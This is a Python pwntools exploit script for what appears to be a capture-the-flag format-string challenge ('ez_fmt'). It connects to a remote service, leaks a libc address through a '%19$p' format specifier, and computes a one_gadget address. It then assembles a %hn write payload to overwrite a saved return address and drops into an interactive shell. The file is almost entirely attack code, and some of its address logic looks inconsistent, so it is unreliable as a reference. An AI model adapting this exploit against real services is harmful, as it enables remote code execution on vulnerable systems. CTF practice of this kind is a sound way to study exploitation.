from pwn import *

# import time

# from LibcSearcher import *

# from ctypes import *
# from struct import pack
# from ae64 import AE64

# io = process('./ez_fmt')
# io = remote("47.104.24.40", 1337)
io = remote("192.168.170.128", 9998)
# io = remote("192.168.170.128", 1234)


# io = remote("192.168.170.128", 1234)
# io = remote("47.76.55.63", 23877)
# io = remote("node4.buuoj.cn", 28567)


# io = remote("120.46.59.242",   2150)
# io = remote("43.249.195.138",  26189)
# io = remote("8.130.35.16", 52003)
# io = remote("chall.pwnable.tw", 10100)
# io = remote("61.147.171.105",   51565)
# io = remote("112.6.51.212", 30791)


# gdb.attach(io)
# context(os='linux', arch = 'amd64', log_level = "debug")
# elf = ELF('./ciscn_2019_es_2')
# libc = ELF('./2.31-0ubuntu9_amd64/libc-2.31.so')


# libc = ELF('./libc-2.23.so')

def s(a):
    io.send(a)


def sa(a, b):
    io.sendafter(a, b)


def sl(a):
    io.sendline(a)


def sal(a, b):
    io.sendlineafter(a, b)


def r(n):
    return (io.recv(n))


def ru(a):
    return io.recvuntil(a)


def rl():
    return io.recvline()


def sla(a, b):
    io.sendlineafter(a, b)


def debug():
    gdb.attach(io)
    pause()


def get_addr():
    return u64(ru(b'\x7f')[-6:].ljust(8, b'\x00'))


def inter():
    return io.interactive()


def operater(optr, opnd1, opnd2):
    optr_str_list = ['×', '**', '+', '-', '÷', '%']
    if optr in optr_str_list:
        index = optr_str_list.index(optr)
    if optr == optr_str_list[0]:  # 乘法
        result = opnd1 * opnd2
    elif optr == optr_str_list[1]:  # 幂运算
        result = opnd1 ** opnd2
    elif optr == optr_str_list[2]:  # 加法
        result = opnd1 + opnd2
    elif optr == optr_str_list[3]:  # 减法
        result = opnd1 - opnd2
    elif optr == optr_str_list[4]:  # 除法
        if opnd2 != 0:  # 避免除以零错误
            result = opnd1 / opnd2
        else:
            result = "Error: Division by zero"
    elif optr == optr_str_list[5]:  # 取余
        if opnd2 != 0:  # 避免取余时除数为零
            result = opnd1 % opnd2
        else:
            result = "Error: Modulo by zero"
    else:
        result = "Error: Invalid operator"

    return result


# libc = ELF('./libc.so.6')
# puts_plt = elf.plt['puts']
# puts_got = elf.got['puts']
# printf_plt = elf.plt['printf']
# atoi_got = elf.got['atoi']
# main_addr = elf.symbols['main']

# context(os='linux', arch='amd64')
context(os='linux', arch='amd64', log_level="debug")

ru(b"0x")
stack = int(io.recv(12), 16) - 0x110 - 8
print(hex(stack))

# payload = fmtstr_payload(6, {0x0404010:0xffff})
# sl(payload)

libc = ELF('./libc-2.31.so')

one_gadget = 0x0e3b01
write_size = 0
offset = 6 + 6  # offset根据payload对齐的字节来决定
payload = b''
payload1 = b'%19$p'
s(payload1)
print(rl())
# rsp = int(io.recv(14), 16)
# print("rsp = ", hex(rsp))
rip = int(io.recv(14), 16)
print("rip = ", hex(rip))
libc_base = (rip - 243) - libc.symbols['__libc_start_main']
one_gadget += libc_base
for i in range(3):  # 一共三次，每次修改两字节
    num = (one_gadget >> (16 * i)) & 0xffff  # 每次将onegadget右移两字节
    # num -= 23  # >>> printf打印的 "There is a gift for you " 的长度为23
    if num > write_size & 0xffff:  # 如果这一次要写入的字节数大于已经写入的字节数，只需要写入num和write_size之差的字节数即可，因为
        payload += ('%{}c%{}$hn'.format(num - (write_size & 0xffff + len(payload1)), offset + i)).encode(
            'utf-8')  # 前面已经写入了write_size + len(payload1)个字节，再加上差值就能
        write_size += num - (write_size & 0xffff)  # 写入num个字节了
    else:
        # 如果本次要写入的字节数小于已经写入的字节数，那么我们是不能直接写入num个字节的，可以理解为溢出了，比如已经写入了0xffff个字节，而本次要写入0xeeee
        # 个字节，”超额“写入了，这个时候就需要写入负数，四字节的最大值为0xffff，可以理解为0x10000为0，0-0xffff得到一个负数-0xffff，然后再加上0xeeee得到差值-0x1111。
        payload += ('%{}c%{}$hn'.format((0x10000 - (write_size & 0xffff + len(payload1))) + num, offset + i)).encode('utf-8')
        write_size += 0x10000 - (write_size & 0xffff) + num
print("len:", len(payload))
payload = payload.ljust(0x38, b'a')  # 八字节对齐

payload += fmtstr_payload(6, {0x0404010: 0xffff})
for i in range(3):
    payload += p64(rip + i * 2)  # 将存储着返回地址的栈地址放到payload的最末尾，每次加2
sl(payload)
# gdb.attach(io)
# pause()
print(payload)

inter()
